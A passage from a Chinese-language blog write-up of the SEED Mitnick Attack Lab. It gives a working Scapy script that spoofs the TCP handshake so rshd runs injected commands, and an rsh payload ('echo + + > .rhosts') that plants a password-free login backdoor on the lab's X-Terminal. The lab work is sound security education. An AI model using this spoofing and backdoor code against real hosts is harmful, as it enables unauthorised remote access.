+<h2 id="Task-2-2-Spoof-the-Second-TCP-Connection"><a href="#Task-2-2-Spoof-the-Second-TCP-Connection" class="headerlink" title="Task 2.2: Spoof the Second TCP Connection"></a>Task 2.2: Spoof the Second TCP Connection</h2><p>建立第一个连接后，X-Terminal将发起第二个连接。rshd使用这个连接发送错误消息。在我们的攻击中，我们不会使用这个连接，但是如果没有建立这个连接，rshd将停止而不执行我们的命令。因此，我们需要使用欺骗来帮助X-Terminal和受信任的服务器完成建立此连接。<br><img src="/2023/05/16/The-Mitnick-Attack-Lab/15.png" srcset="/img/loading.gif" lazyload alt="The Second Connection"><br>我们需要编写另一个嗅探和欺骗程序，嗅探发送到受信任服务器的9090端口的TCP流量(假设任务2.1中使用9090)。当它看到一个SYN包时，它应该响应一个SYN+ACK包。响应的包应该有一个任意32位无符号整数的初始seq值，随机生成也行，但是为了方便这里直接使用了对方发过来的序列号<code>tcp.seq = pkt[TCP].seq</code>。如果两个连接都建立成功，rshd将执行rsh数据包中包含的命令。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-keyword">if</span> pkt[TCP].flags == <span class="hljs-string">&quot;S&quot;</span> <span class="hljs-keyword">and</span> pkt[IP].src == <span class="hljs-string">&quot;10.9.0.5&quot;</span>:<br>        old_ip = pkt[IP]<br>        old_tcp = pkt[TCP]<br>        tcp_len = old_ip.<span class="hljs-built_in">len</span> - old_ip.ihl*<span class="hljs-number">4</span> - old_tcp.dataofs*<span class="hljs-number">4</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(old_ip.src, old_tcp.sport,<br>            old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))<br><br>        ip = IP(src=<span class="hljs-string">&quot;10.9.0.6&quot;</span>, dst=<span class="hljs-string">&quot;10.9.0.5&quot;</span>)<br>        tcp = TCP(sport=<span class="hljs-number">9090</span>, dport=pkt[TCP].sport)<br>        tcp.flags = <span class="hljs-string">&quot;SA&quot;</span><br>        tcp.seq = pkt[TCP].seq<br>        tcp.ack = pkt[TCP].seq + <span class="hljs-number">1</span><br>        p = ip / tcp<br>        send(p)<br><br>myFilter = <span class="hljs-string">&#x27;tcp&#x27;</span><br>sniff(iface=<span class="hljs-string">&#x27;br-7db1d5ae22b8&#x27;</span>, <span class="hljs-built_in">filter</span>=myFilter, prn=spoof)<br></code></pre></td></tr></table></figure>
+<p>我们先运行两个嗅探程序，然后再发出伪造的SYN报文，即可成功建立两个TCP连接。<br><img src="/2023/05/16/The-Mitnick-Attack-Lab/16.png" srcset="/img/loading.gif" lazyload><br><img src="/2023/05/16/The-Mitnick-Attack-Lab/17.png" srcset="/img/loading.gif" lazyload><br><img src="/2023/05/16/The-Mitnick-Attack-Lab/18.png" srcset="/img/loading.gif" lazyload><br>使用wireshark抓包可以看到成功建立TCP连接，如下：<br><img src="/2023/05/16/The-Mitnick-Attack-Lab/19.png" srcset="/img/loading.gif" lazyload><br><img src="/2023/05/16/The-Mitnick-Attack-Lab/20.png" srcset="/img/loading.gif" lazyload><br>检查seed-attacker的tmp文件夹，已经成功创建xyz文件，同时可以看到时间戳与当前时间匹配，证明是刚创建的。<br><img src="/2023/05/16/The-Mitnick-Attack-Lab/21.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Task-3-Set-Up-a-Backdoor"><a href="#Task-3-Set-Up-a-Backdoor" class="headerlink" title="Task 3: Set Up a Backdoor"></a>Task 3: Set Up a Backdoor</h1><p>在Task 2中，我们在攻击中只运行了一个touch命令，以证明我们可以成功地在X-Terminal上运行一个命令。如果我们以后想要运行更多的命令，我们总是可以发起相同的攻击。这很不方便。<br>为了不让我们重复发起攻击，我们在X-Terminal中设置一个后门。这个后门允许他在任何时候正常登录X-Terminal，而不需要输入任何密码。为了实现这个目标，正如我们前面说到，我们所需要的就是将字符串“+ +”添加到.rhosts文件中。<br>这个设置很简单，我们只需要修改task2.1第三部分的代码的touch命令部分，修改为<code>echo + + &gt; .rhosts</code>即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">&#x27;9090\x00seed\x00seed\x00echo + + &gt; .rhosts\x00&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>wireshark中可以看到，我们成功设置remote shell为<code>echo + + &gt; .rhosts</code>，并且我们使用seed-attacker已经可以直接免密远程登录到X-Terminal。<br><img src="/2023/05/16/The-Mitnick-Attack-Lab/22.png" srcset="/img/loading.gif" lazyload><br><img src="/2023/05/16/The-Mitnick-Attack-Lab/23.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/seed/">#seed</a>
+      
+        <a href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">#软件安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>The Mitnick Attack Lab</div>
+      <div>http://example.com/2023/05/16/The-Mitnick-Attack-Lab/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Keshanju</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年5月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/12/DVWA%E9%80%9A%E5%85%B3%E2%80%94%E2%80%94Brute-Force%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" title="DVWA通关——Brute Force暴力破解">
+                        <span class="hidden-mobile">DVWA通关——Brute Force暴力破解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
